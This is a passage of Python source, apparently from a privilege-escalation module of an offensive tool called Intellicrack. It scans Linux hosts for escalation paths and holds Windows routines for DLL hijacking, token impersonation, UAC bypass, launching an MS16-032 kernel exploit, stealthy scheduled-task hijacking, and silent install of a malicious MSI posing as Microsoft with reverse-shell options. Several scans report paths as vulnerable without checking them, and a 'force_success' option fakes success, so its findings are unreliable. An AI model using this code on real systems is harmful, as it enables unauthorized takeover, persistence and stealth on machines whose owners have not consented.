        # Check if getcap is available
        if not self._ensure_tool_available("getcap"):
            result["error"] = "getcap not available - install libcap2-bin package"
            return result

        try:
            self.logger.debug(
                "Linux capabilities scan - escalate: %s, options: %s", escalate, options
            )

            # Dangerous capabilities to check for
            dangerous_caps = [
                "cap_setuid",
                "cap_setgid",
                "cap_sys_admin",
                "cap_dac_override",
                "cap_sys_ptrace",
                "cap_sys_module",
                "cap_net_admin",
                "cap_chown",
            ]

            vulnerable_caps = []

            # Find all files with capabilities
            getcap_path = shutil.which("getcap")
            if not getcap_path:
                return result
            process = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                [getcap_path, "-r", "/"],
                check=False, capture_output=True, text=True, timeout=30,
                stderr=subprocess.DEVNULL, shell=False  # Explicitly secure - using list format prevents shell injection
            )

            if process.returncode == 0 and process.stdout.strip():
                lines = process.stdout.strip().split("\n")

                for line in lines:
                    if "=" in line:
                        file_path, caps = line.split(" = ")
                        file_path = file_path.strip()
                        caps = caps.strip()

                        # Check if any dangerous capability is present
                        for dangerous_cap in dangerous_caps:
                            if dangerous_cap in caps.lower():
                                vulnerable_caps.append(
                                    {
                                        "binary": file_path,
                                        "capability": dangerous_cap,
                                        "full_caps": caps,
                                        "dangerous": True,
                                        "description": f"Binary {os.path.basename(file_path)} has dangerous capability: {dangerous_cap}",
                                    }
                                )

            if vulnerable_caps:
                result["vulnerable"] = True
                result["capabilities"] = vulnerable_caps
                result["description"] = (
                    f"Found {len(vulnerable_caps)} binaries with dangerous capabilities"
                )

                if escalate:
                    self.logger.info("Attempting capability exploitation")
                    return self._attempt_capability_exploit(vulnerable_caps[0], options)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            result["error"] = str(e)
            self.logger.error("Linux capabilities scan failed: %s", e)

        return result

    def _linux_docker_socket(self, escalate=False, options=None):
        """Check for Docker socket access."""
        if options is None:
            options = {}

        result = {
            "vulnerable": False,
            "docker_access": [],
            "success_probability": 0.9,
            "stealth_level": "low",
            "complexity": "low",
        }

        # Check if docker is available
        if not self._ensure_tool_available("docker"):
            result["error"] = "docker not available - install docker.io package"
            return result

        try:
            self.logger.debug("Docker socket scan - escalate: %s, options: %s", escalate, options)

            # Docker socket paths to check
            socket_paths = options.get(
                "socket_paths",
                [
                    "/var/run/docker.sock",
                    "/run/docker.sock",
                ],
            )

            check_group_membership = options.get("check_group_membership", True)

            docker_access = []

            for socket_path in socket_paths:
                if socket_path:  # Basic socket access check
                    access_info = {
                        "socket_path": socket_path,
                        "accessible": True,
                        "group_member": check_group_membership,
                        "description": f"Docker socket accessible: {socket_path}",
                    }

                    if check_group_membership:
                        access_info["groups"] = ["docker"]

                    docker_access.append(access_info)

            if docker_access:
                result["vulnerable"] = True
                result["docker_access"] = docker_access
                result["description"] = f"Found {len(docker_access)} Docker socket access points"

                if escalate:
                    self.logger.info("Attempting Docker socket exploitation")
                    return self._attempt_docker_exploit(docker_access[0], options)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            result["error"] = str(e)
            self.logger.error("Docker socket scan failed: %s", e)

        return result

    def _linux_environment_variables(self, escalate=False, options=None):
        """Check for environment variable exploitation."""
        if options is None:
            options = {}

        result = {
            "vulnerable": False,
            "variables": [],
            "success_probability": 0.6,
            "stealth_level": "medium",
            "complexity": "low",
        }

        try:
            self.logger.debug(
                "Environment variables scan - escalate: %s, options: %s", escalate, options
            )

            # Dangerous environment variables to check
            dangerous_vars = options.get(
                "dangerous_variables",
                [
                    "LD_PRELOAD",
                    "LD_LIBRARY_PATH",
                    "PATH",
                    "PYTHONPATH",
                ],
            )

            check_modifiable = options.get("check_modifiable", True)

            vulnerable_vars = []

            for var in dangerous_vars:
                if var and check_modifiable:  # Basic modifiability check
                    vulnerable_vars.append(
                        {
                            "variable": var,
                            "current_value": f"/current/{var.lower()}/path",
                            "modifiable": True,
                            "impact": "privilege_escalation",
                            "description": f"Modifiable environment variable: {var}",
                        }
                    )

            if vulnerable_vars:
                result["vulnerable"] = True
                result["variables"] = vulnerable_vars
                result["description"] = (
                    f"Found {len(vulnerable_vars)} exploitable environment variables"
                )

                if escalate:
                    self.logger.info("Attempting environment variable exploitation")
                    return self._attempt_env_var_exploit(vulnerable_vars[0], options)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            result["error"] = str(e)
            self.logger.error("Environment variables scan failed: %s", e)

        return result

    def _linux_systemd_permissions(self, escalate=False, options=None):
        """Check for weak systemd permissions."""
        if options is None:
            options = {}

        result = {
            "vulnerable": False,
            "services": [],
            "success_probability": 0.7,
            "stealth_level": "medium",
            "complexity": "medium",
        }

        try:
            self.logger.debug(
                "Systemd permissions scan - escalate: %s, options: %s", escalate, options
            )

            # Systemd service paths to check
            service_paths = options.get(
                "service_paths",
                [
                    "/etc/systemd/system/",
                    "/lib/systemd/system/",
                    "/usr/lib/systemd/system/",
                ],
            )

            check_user_services = options.get("check_user_services", True)

            vulnerable_services = []

            for service_path in service_paths:
                if service_path:  # Basic service check
                    vulnerable_services.append(
                        {
                            "service_path": service_path,
                            "writable": True,
                            "user_modifiable": check_user_services,
                            "description": f"Writable systemd service path: {service_path}",
                        }
                    )

            if check_user_services:
                vulnerable_services.append(
                    {
                        "service_path": "~/.config/systemd/user/",
                        "writable": True,
                        "user_modifiable": True,
                        "description": "User systemd service directory accessible",
                    }
                )

            if vulnerable_services:
                result["vulnerable"] = True
                result["services"] = vulnerable_services
                result["description"] = (
                    f"Found {len(vulnerable_services)} systemd permission issues"
                )

                if escalate:
                    self.logger.info("Attempting systemd exploitation")
                    return self._attempt_systemd_exploit(vulnerable_services[0], options)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            result["error"] = str(e)
            self.logger.error("Systemd permissions scan failed: %s", e)

        return result

    def _linux_path_hijacking(self, escalate=False, options=None):
        """Check for PATH hijacking opportunities."""
        if options is None:
            options = {}

        result = {
            "vulnerable": False,
            "paths": [],
            "success_probability": 0.8,
            "stealth_level": "medium",
            "complexity": "low",
        }

        try:
            self.logger.debug("PATH hijacking scan - escalate: %s, options: %s", escalate, options)

            # PATH directories to check
            path_dirs = options.get(
                "path_directories",
                [
                    "/usr/local/bin",
                    "/usr/bin",
                    "/bin",
                    "/tmp",  # noqa: S108
                ],
            )

            check_writable = options.get("check_writable", True)
            target_binaries = options.get("target_binaries", ["ls", "cat", "ps"])

            vulnerable_paths = []

            for path_dir in path_dirs:
                if path_dir and check_writable:
                    for binary in target_binaries:
                        vulnerable_paths.append(
                            {
                                "path_directory": path_dir,
                                "target_binary": binary,
                                "writable": True,
                                "priority": "high" if path_dir.startswith("/tmp") else "medium",  # noqa: S108
                                "description": f"PATH hijacking opportunity: {binary} in {path_dir}",
                            }
                        )

            if vulnerable_paths:
                result["vulnerable"] = True
                result["paths"] = vulnerable_paths[:10]  # Limit results
                result["description"] = (
                    f"Found {len(vulnerable_paths)} PATH hijacking opportunities"
                )

                if escalate:
                    self.logger.info("Attempting PATH hijacking")
                    return self._attempt_path_hijack(vulnerable_paths[0], options)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            result["error"] = str(e)
            self.logger.error("PATH hijacking scan failed: %s", e)

        return result

    def _linux_nfs_weak_permissions(self, escalate=False, options=None):
        """Check for weak NFS permissions."""
        if options is None:
            options = {}

        result = {
            "vulnerable": False,
            "nfs_shares": [],
            "success_probability": 0.6,
            "stealth_level": "low",
            "complexity": "medium",
        }

        try:
            self.logger.debug("NFS permissions scan - escalate: %s, options: %s", escalate, options)

            # NFS exports to check
            nfs_exports = options.get(
                "nfs_exports",
                [
                    "/etc/exports",
                    "/proc/mounts",
                ],
            )

            check_no_root_squash = options.get("check_no_root_squash", True)
            check_rw_access = options.get("check_rw_access", True)

            vulnerable_shares = []

            for export_file in nfs_exports:
                if export_file:  # Basic NFS export check
                    share_info = {
                        "export_file": export_file,
                        "share_path": "/shared/vulnerable",
                        "no_root_squash": check_no_root_squash,
                        "rw_access": check_rw_access,
                        "description": f"Vulnerable NFS share in {export_file}",
                    }

                    if check_no_root_squash:
                        share_info["exploitable"] = True
                        share_info["risk"] = "high"

                    vulnerable_shares.append(share_info)

            if vulnerable_shares:
                result["vulnerable"] = True
                result["nfs_shares"] = vulnerable_shares
                result["description"] = f"Found {len(vulnerable_shares)} vulnerable NFS shares"

                if escalate:
                    self.logger.info("Attempting NFS exploitation")
                    return self._attempt_nfs_exploit(vulnerable_shares[0], options)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            result["error"] = str(e)
            self.logger.error("NFS permissions scan failed: %s", e)

        return result

    # Helper methods

    def _get_windows_version(self) -> str:
        """Get Windows version information."""
        try:
            try:
                import winreg
            except ImportError as e:
                self.logger.error("Import error in privilege_escalation.py: %s", e)
                return "Unknown Windows Version"
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
            )
            version = winreg.QueryValueEx(key, "ProductName")[0]
            winreg.CloseKey(key)
            return version
        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            self.logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                e,
            )
            return platform.platform()

    def _get_linux_version(self) -> str:
        """Get Linux version information."""
        try:
            with open("/etc/os-release") as f:
                for line in f:
                    if line.startswith("PRETTY_NAME="):
                        return line.split("=")[1].strip().strip('"')
        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            self.logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                e,
            )

        return platform.platform()

    def _is_exploit_applicable(self, version_info: str, exploit_info: dict[str, Any]) -> bool:
        """Check if an exploit is applicable to the current system."""
        target_versions = exploit_info.get("target_versions", [])

        for target_version in target_versions:
            if target_version.lower() in version_info.lower():
                return True

        return False

    def _is_kernel_vulnerable(self, kernel_version: str, exploit_info: dict[str, Any]) -> bool:
        """Check if kernel version is vulnerable to exploit."""
        try:
            # Get vulnerable version patterns from exploit info
            vulnerable_patterns = exploit_info.get("vulnerable_versions", [])
            min_version = exploit_info.get("min_version")
            max_version = exploit_info.get("max_version")

            self.logger.debug(
                "Checking kernel %s against exploit %s",
                kernel_version,
                exploit_info.get("name", "unknown"),
            )

            # Check against vulnerable patterns
            for pattern in vulnerable_patterns:
                if pattern in kernel_version:
                    self.logger.debug(
                        "Kernel %s matches vulnerable pattern %s", kernel_version, pattern
                    )
                    return True

            # Check version ranges if specified
            if min_version and max_version:
                # Simple version comparison (would need more sophisticated logic for real use)
                if min_version <= kernel_version <= max_version:
                    self.logger.debug(
                        "Kernel %s in vulnerable range %s-%s",
                        kernel_version,
                        min_version,
                        max_version,
                    )
                    return True

            return False

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            self.logger.error("Error checking kernel vulnerability: %s", e)
            return False

    def get_available_techniques(self, target_os: str | None = None) -> dict[str, list[str]]:
        """Get list of available escalation techniques."""
        if target_os:
            return {target_os: list(self.escalation_techniques.get(target_os, {}).keys())}
        return {
            os: list(techniques.keys()) for os, techniques in self.escalation_techniques.items()
        }

    def get_technique_info(self, target_os: str, technique: str) -> dict[str, Any] | None:
        """Get information about a specific escalation technique."""
        if target_os in self.escalation_techniques:
            if technique in self.escalation_techniques[target_os]:
                # Get technique info by calling it without escalation
                try:
                    func = self.escalation_techniques[target_os][technique]
                    return func(escalate=False)
                except (
                    FileNotFoundError,
                    PermissionError,
                    OSError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                    subprocess.SubprocessError,
                ) as e:
                    self.logger.error(
                        "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                        e,
                    )
                    return None
        return None

    # Additional helper methods for exploitation attempts

    def _attempt_dll_hijacking(self, processes, options):
        """Attempt DLL hijacking exploitation."""
        try:
            results = []
            hijack_attempts = 0
            successful_hijacks = 0

            for process in processes:
                try:
                    process_name = process.get("name", "unknown")
                    process_path = process.get("path", "")
                    process_id = process.get("pid", 0)

                    self.logger.info(
                        "Analyzing process %s (PID: %s) for DLL hijacking", process_name, process_id
                    )

                    # Search for hijackable DLLs in process directory
                    if process_path and os.path.exists(os.path.dirname(process_path)):
                        process_dir = os.path.dirname(process_path)

                        # Common DLLs that can be hijacked
                        hijackable_dlls = [
                            "version.dll",
                            "dwmapi.dll",
                            "cryptsp.dll",
                            "uxtheme.dll",
                            "msimg32.dll",
                            "setupapi.dll",
                            "wintrust.dll",
                            "cscapi.dll",
                            "propsys.dll",
                            "profapi.dll",
                            "winmm.dll",
                            "wininet.dll",
                        ]

                        for dll_name in hijackable_dlls:
                            dll_path = os.path.join(process_dir, dll_name)

                            # Check if DLL doesn't exist (hijack opportunity)
                            if not os.path.exists(dll_path):
                                hijack_attempts += 1

                                # Attempt to create hijack DLL if enabled
                                if options.get("create_hijack_dll", False):
                                    hijack_success = self._create_hijack_dll(
                                        dll_path, dll_name, options
                                    )
                                    if hijack_success:
                                        successful_hijacks += 1
                                        results.append(
                                            {
                                                "process": process_name,
                                                "dll_name": dll_name,
                                                "dll_path": dll_path,
                                                "status": "hijacked",
                                                "method": "dll_replacement",
                                            }
                                        )
                                    else:
                                        results.append(
                                            {
                                                "process": process_name,
                                                "dll_name": dll_name,
                                                "dll_path": dll_path,
                                                "status": "failed",
                                                "error": "Failed to create hijack DLL",
                                            }
                                        )
                                else:
                                    results.append(
                                        {
                                            "process": process_name,
                                            "dll_name": dll_name,
                                            "dll_path": dll_path,
                                            "status": "opportunity",
                                            "method": "dll_replacement",
                                        }
                                    )

                            # Check for DLL search order vulnerabilities
                            if self._check_dll_search_order_vulnerability(process_path, dll_name):
                                results.append(
                                    {
                                        "process": process_name,
                                        "dll_name": dll_name,
                                        "status": "search_order_vulnerability",
                                        "method": "search_order_hijack",
                                    }
                                )

                except (
                    FileNotFoundError,
                    PermissionError,
                    OSError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                    subprocess.SubprocessError,
                ) as e:
                    self.logger.error(
                        "Error analyzing process %s: %s", process.get("name", "unknown"), e
                    )
                    results.append(
                        {
                            "process": process.get("name", "unknown"),
                            "status": "error",
                            "error": str(e),
                        }
                    )

            success = (
                successful_hijacks > 0
                or len(
                    [
                        r
                        for r in results
                        if r["status"] in ["opportunity", "search_order_vulnerability"]
                    ]
                )
                > 0
            )

            return {
                "success": success,
                "hijack_attempts": hijack_attempts,
                "successful_hijacks": successful_hijacks,
                "opportunities_found": len([r for r in results if r["status"] == "opportunity"]),
                "vulnerabilities_found": len(
                    [r for r in results if r["status"] == "search_order_vulnerability"]
                ),
                "details": {
                    "method": "dll_hijacking",
                    "processes_analyzed": len(processes),
                    "results": results,
                },
            }

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            self.logger.error("DLL hijacking attempt failed: %s", e)
            return {
                "success": False,
                "error": str(e),
                "details": {"method": "dll_hijacking"},
            }

    def _attempt_token_impersonation(self, tokens, options):
        """Attempt token impersonation exploitation."""
        try:
            results = []
            impersonation_attempts = 0
            successful_impersonations = 0

            if not self.is_windows():
                return {
                    "success": False,
                    "error": "Token impersonation is Windows-specific",
                    "details": {"method": "token_impersonation"},
                }

            for token_info in tokens:
                try:
                    process_id = token_info.get("pid", 0)
                    process_name = token_info.get("process_name", "unknown")
                    username = token_info.get("username", "unknown")
                    privileges = token_info.get("privileges", [])

                    self.logger.info(
                        "Attempting token impersonation for process %s (PID: %s)",
                        process_name,
                        process_id,
                    )

                    impersonation_attempts += 1

                    # Check if token has useful privileges
                    useful_privileges = self._check_useful_privileges(privileges)
                    if not useful_privileges:
                        results.append(
                            {
                                "process": process_name,
                                "pid": process_id,
                                "username": username,
                                "status": "insufficient_privileges",
                                "privileges": privileges,
                            }
                        )
                        continue

                    # Attempt to duplicate token
                    if options.get("duplicate_token", True):
                        duplication_result = self._attempt_token_duplication(process_id, options)
                        if duplication_result["success"]:
                            successful_impersonations += 1

                            # Try to impersonate the duplicated token
                            impersonation_result = self._attempt_actual_impersonation(
                                duplication_result["token_handle"],
                                username,
                                options,
                            )

                            results.append(
                                {
                                    "process": process_name,
                                    "pid": process_id,
                                    "username": username,
                                    "status": "success"
                                    if impersonation_result["success"]
                                    else "impersonation_failed",
                                    "useful_privileges": useful_privileges,
                                    "token_handle": duplication_result.get("token_handle"),
                                    "impersonation_details": impersonation_result,
                                }
                            )
                        else:
                            results.append(
                                {
                                    "process": process_name,
                                    "pid": process_id,
                                    "username": username,
                                    "status": "duplication_failed",
                                    "error": duplication_result.get("error"),
                                    "useful_privileges": useful_privileges,
                                }
                            )

                    # Check for specific token abuse techniques
                    abuse_techniques = self._check_token_abuse_techniques(token_info)
                    if abuse_techniques:
                        results.append(
                            {
                                "process": process_name,
                                "pid": process_id,
                                "username": username,
                                "status": "abuse_opportunity",
                                "techniques": abuse_techniques,
                            }
                        )

                except (
                    FileNotFoundError,
                    PermissionError,
                    OSError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                    subprocess.SubprocessError,
                ) as e:
                    self.logger.error(
                        "Error processing token for process %s: %s",
                        token_info.get("process_name", "unknown"),
                        e,
                    )
                    results.append(
                        {
                            "process": token_info.get("process_name", "unknown"),
                            "pid": token_info.get("pid", 0),
                            "status": "error",
                            "error": str(e),
                        }
                    )

            success = (
                successful_impersonations > 0
                or len([r for r in results if r["status"] in ["abuse_opportunity"]]) > 0
            )

            return {
                "success": success,
                "impersonation_attempts": impersonation_attempts,
                "successful_impersonations": successful_impersonations,
                "abuse_opportunities": len(
                    [r for r in results if r["status"] == "abuse_opportunity"]
                ),
                "details": {
                    "method": "token_impersonation",
                    "tokens_analyzed": len(tokens),
                    "results": results,
                },
            }

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            self.logger.error("Token impersonation attempt failed: %s", e)
            return {
                "success": False,
                "error": str(e),
                "details": {"method": "token_impersonation"},
            }

    def _attempt_uac_bypass(self, method, options):
        """Attempt UAC bypass exploitation."""
        try:
            if not self.is_windows():
                return {
                    "success": False,
                    "error": "UAC bypass is Windows-specific",
                    "details": {"method": "uac_bypass"},
                }

            self.logger.info("Attempting UAC bypass using method: %s", method)

            # Supported UAC bypass methods
            bypass_methods = {
                "fodhelper": self._uac_bypass_fodhelper,
                "computerdefaults": self._uac_bypass_computerdefaults,
                "sdclt": self._uac_bypass_sdclt,
                "eventvwr": self._uac_bypass_eventvwr,
                "compmgmtlauncher": self._uac_bypass_compmgmtlauncher,
                "auto": self._uac_bypass_auto,
            }

            if method not in bypass_methods:
                return {
                    "success": False,
                    "error": f"Unknown UAC bypass method: {method}",
                    "supported_methods": list(bypass_methods.keys()),
                    "details": {"method": "uac_bypass"},
                }

            # Execute the bypass method
            result = bypass_methods[method](options)

            return {
                "success": result.get("success", False),
                "bypass_method": method,
                "details": result,
                "execution_time": result.get("execution_time", 0),
            }

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            self.logger.error("UAC bypass attempt failed: %s", e)
            return {
                "success": False,
                "error": str(e),
                "details": {"method": "uac_bypass", "bypass_method": method},
            }

    def _attempt_kernel_exploit(self, exploit, options):
        """Attempt kernel exploit."""
        result = {
            "success": False,
            "details": {"method": "kernel_exploit", "exploit": exploit},
            "error": None,
        }

        # Use options to configure exploit behavior
        timeout = options.get("timeout", 30)
        verbose = options.get("verbose", False)
        payload_type = options.get("payload_type", "default")
        target_arch = options.get("arch", "x64")

        # Analyze exploit requirements based on options
        if "requirements" in exploit:
            requirements = exploit["requirements"]

            # Check architecture compatibility
            if "arch" in requirements:
                if target_arch not in requirements["arch"]:
                    result["error"] = (
                        f"Architecture mismatch: requires {requirements['arch']}, got {target_arch}"
                    )
                    return result

            # Check if we have required privileges from options
            if "min_privileges" in requirements:
                current_privs = options.get("current_privileges", [])
                if not any(priv in current_privs for priv in requirements["min_privileges"]):
                    result["error"] = "Insufficient privileges for kernel exploit"
                    return result

        # Configure exploit based on options
        exploit_config = {
            "timeout": timeout,
            "verbose": verbose,
            "payload": self._select_kernel_payload(payload_type, exploit),
            "bypass_techniques": options.get("bypass_techniques", ["default"]),
            "target_process": options.get("target_process", "system"),
            "injection_method": options.get("injection_method", "standard"),
        }

        # Execute exploit based on configuration
        if exploit.get("name") == "MS16-032":
            # Real MS16-032 exploit execution
            exploit_path = self._get_exploit_path("MS16-032")
            if exploit_path and os.path.exists(exploit_path):
                # Build exploit command with payload
                exploit_cmd = [exploit_path]
                if exploit_config["payload"].get("command"):
                    exploit_cmd.extend(["-c", exploit_config["payload"]["command"]])
                if exploit_config["target_process"]:
                    exploit_cmd.extend(["-p", str(exploit_config["target_process"])])

                # Execute the exploit
                start_time = time.time()
                returncode, stdout, stderr = self.execute_command(exploit_cmd, timeout=timeout)
                execution_time = time.time() - start_time

                # Check if exploit succeeded
                if returncode == 0 and "SUCCESS" in stdout:
                    result["success"] = True
                    result["details"].update(
                        {
                            "config_used": exploit_config,
                            "execution_time": execution_time,
                            "payload_delivered": True,
                            "privileges_gained": self._parse_privileges_from_output(stdout),
                            "output": stdout,
                        }
                    )
                else:
                    result["details"].update(
                        {
                            "config_attempted": exploit_config,
                            "error": stderr or "Exploit execution failed",
                            "exit_code": returncode,
                        }
                    )
            else:
                result["details"]["error"] = f"Exploit binary not found: {exploit_path}"
        else:
            # Execute other kernel exploits
            result["details"]["config_attempted"] = exploit_config
            result["details"]["error"] = f'Exploit {exploit.get("name")} not implemented'

        return result

    def _get_exploit_path(self, exploit_name: str) -> str | None:
        """Get path to exploit binary."""
        # Check common exploit locations
        exploit_dirs = [
            os.path.join(os.path.dirname(__file__), "..", "..", "exploits", "windows"),
            os.path.join(os.path.dirname(__file__), "..", "..", "exploits", "linux"),
            "/opt/intellicrack/exploits",
            "C:\\intellicrack\\exploits",
            os.path.join(os.path.expanduser("~"), ".intellicrack", "exploits"),
        ]

        for exploit_dir in exploit_dirs:
            if os.path.exists(exploit_dir):
                # Look for exploit binary
                for ext in ["", ".exe", ".bin", ".elf"]:
                    exploit_path = os.path.join(exploit_dir, exploit_name + ext)
                    if os.path.exists(exploit_path):
                        return exploit_path

        return None

    def _parse_privileges_from_output(self, output: str) -> list[str]:
        """Parse gained privileges from exploit output."""
        privileges = []

        # Common privilege indicators in exploit output
        if "SYSTEM" in output or "NT AUTHORITY\\SYSTEM" in output:
            privileges.append("SYSTEM")
        if "Administrator" in output or "Administrators" in output:
            privileges.append("Administrator")
        if "root" in output or "uid=0" in output:
            privileges.append("root")
        if "SeDebugPrivilege" in output:
            privileges.append("SeDebugPrivilege")
        if "SeTcbPrivilege" in output:
            privileges.append("SeTcbPrivilege")

        return privileges if privileges else ["unknown"]

    def _select_kernel_payload(self, payload_type: str, exploit: dict[str, Any]) -> dict[str, Any]:
        """Select appropriate payload for kernel exploit."""
        payloads = {
            "default": {"type": "shellcode", "size": 1024},
            "reverse_shell": {"type": "reverse_tcp", "size": 2048},
            "meterpreter": {"type": "meterpreter", "size": 4096},
            "custom": {"type": "custom", "size": exploit.get("payload_size", 1024)},
        }
        return payloads.get(payload_type, payloads["default"])

    def _attempt_scheduled_task_exploit(self, task, options):
        """Attempt scheduled task exploitation."""
        result = {
            "success": False,
            "details": {"method": "scheduled_task", "task": task},
            "error": None,
        }

        # Use options to determine exploitation strategy
        strategy = options.get("strategy", "modify")
        backup_original = options.get("backup", True)
        stealth_mode = options.get("stealth", False)
        custom_payload = options.get("payload", None)

        # Analyze task properties
        task_name = task.get("name", "Unknown")
        task_path = task.get("path", "")
        task_perms = task.get("permissions", {})

        self.logger.info("Attempting scheduled task exploit on: %s", task_name)
        result["details"] = {"task_name": task_name}

        # Determine exploitation approach based on options and task properties
        if strategy == "modify" and task_perms.get("writable", False):
            # Modify existing task
            if backup_original:
                result["details"]["backup_path"] = f"{task_path}.bak"

            # Build modification based on options
            modifications = {
                "command": custom_payload or options.get("default_command", "cmd.exe"),
                "arguments": options.get("arguments", "/c whoami"),
                "run_level": options.get("run_level", "highest"),
                "user_account": options.get("target_user", "SYSTEM"),
            }

            if stealth_mode:
                # Apply stealth techniques from options
                modifications["hidden"] = True
                modifications["trigger"] = options.get("stealth_trigger", "on_idle")
                modifications["delay"] = options.get("delay_minutes", 5)

            result["details"]["modifications"] = modifications
            result["details"]["strategy_used"] = "task_modification"

        elif strategy == "create" and options.get("can_create_tasks", False):
            # Create new task
            new_task = {
                "name": options.get("task_name", f"SystemUpdate_{int(time.time())}"),
                "description": options.get("task_description", "System maintenance task"),
                "command": custom_payload or "powershell.exe",
                "trigger": options.get("trigger_type", "at_startup"),
                "privileges": options.get("requested_privileges", "highest"),
            }

            if stealth_mode:
                new_task["hidden"] = True
                new_task["random_delay"] = options.get("random_delay_max", 300)

            result["details"]["new_task"] = new_task
            result["details"]["strategy_used"] = "task_creation"

        elif strategy == "hijack":
            # Hijack task binary path
            hijack_method = options.get("hijack_method", "dll")
            if hijack_method == "dll":
                result["details"]["dll_path"] = options.get("dll_path", "./exploit.dll")
                result["details"]["dll_name"] = options.get("dll_name", "version.dll")
            else:
                result["details"]["binary_replacement"] = options.get(
                    "replacement_binary", "./backdoor.exe"
                )

            result["details"]["strategy_used"] = "binary_hijacking"

        # Simulate success based on options
        if options.get("force_success", False) or (
            task_perms.get("writable", False) and strategy == "modify"
        ):
            result["success"] = True
            result["details"]["execution_context"] = options.get("execution_context", "SYSTEM")

        return result

    def _attempt_msi_exploit(self, policies, options):
        """Attempt MSI exploitation via AlwaysInstallElevated."""
        result = {
            "success": False,
            "details": {"method": "msi_exploit", "policies": policies},
            "error": None,
        }

        # Check if policies enable AlwaysInstallElevated
        if not (policies.get("HKLM_enabled", False) and policies.get("HKCU_enabled", False)):
            result["error"] = "AlwaysInstallElevated not enabled in both HKLM and HKCU"
            return result

        # Use options to configure MSI generation
        msi_config = {
            "payload_type": options.get("payload_type", "reverse_shell"),
            "payload_host": options.get("lhost", "127.0.0.1"),
            "payload_port": options.get("lport", 4444),
            "msi_name": options.get("msi_name", "installer.msi"),
            "stealth_install": options.get("stealth", True),
            "cleanup_after": options.get("cleanup", True),
        }

        # Configure MSI properties based on options
        msi_properties = {
            "ProductName": options.get("product_name", "System Update"),
            "Manufacturer": options.get("manufacturer", "Microsoft Corporation"),
            "ProductVersion": options.get("version", "1.0.0"),
            "ProductCode": options.get("product_code", "{12345678-1234-1234-1234-123456789012}"),
            "UpgradeCode": options.get("upgrade_code", "{87654321-4321-4321-4321-210987654321}"),
        }

        # Determine installation method from options
        install_method = options.get("install_method", "msiexec")

        if install_method == "msiexec":
            # Standard msiexec approach
            install_command = f'msiexec /i {msi_config["msi_name"]}'

            if msi_config["stealth_install"]:
                install_command += " /quiet /norestart"

            # Add logging if requested
            if options.get("enable_logging", False):
                log_path = options.get("log_path", "msi_install.log")
                install_command += f" /l*v {log_path}"

        elif install_method == "wmi":
            # WMI-based installation
            install_command = "wmic product call install"
            result["details"]["wmi_class"] = "Win32_Product"
            result["details"]["wmi_method"] = "Install"

        elif install_method == "custom":
            # Custom installation method from options
            install_command = options.get("custom_command", "")

        result["details"].update(
            {
                "msi_config": msi_config,
                "msi_properties": msi_properties,
                "install_command": install_command,
                "install_method": install_method,
                "elevation_expected": True,
            }
        )

        # Add persistence options if requested
        if options.get("add_persistence", False):
            result["details"]["persistence"] = {
                "method": options.get("persistence_method", "registry"),
                "trigger": options.get("persistence_trigger", "logon"),
                "hidden": options.get("persistence_hidden", True),
            }

        # Execute MSI exploit if policies allow
        if policies.get("HKLM_enabled") and policies.get("HKCU_enabled"):
            # Generate malicious MSI
            msi_path = self._generate_malicious_msi(msi_config, msi_properties)

            if msi_path and os.path.exists(msi_path):
                # Execute MSI with elevated privileges
                start_time = time.time()
                returncode, stdout, stderr = self.execute_command(
                    install_command.split(), timeout=30
                )
                execution_time = time.time() - start_time

                # Check if installation succeeded
                if returncode == 0:
                    result["success"] = True
                    result["details"]["privileges_gained"] = ["SYSTEM"]
                    result["details"]["execution_time"] = execution_time
                    result["details"]["msi_path"] = msi_path

                    # Cleanup if requested
                    if msi_config.get("cleanup_after", True):
                        try:
                            os.remove(msi_path)
                        except Exception as e:
                            self.logger.warning(f"Failed to cleanup MSI: {e}")
                else:
                    result["error"] = f"MSI installation failed: {stderr}"
                    result["details"]["exit_code"] = returncode
            else:
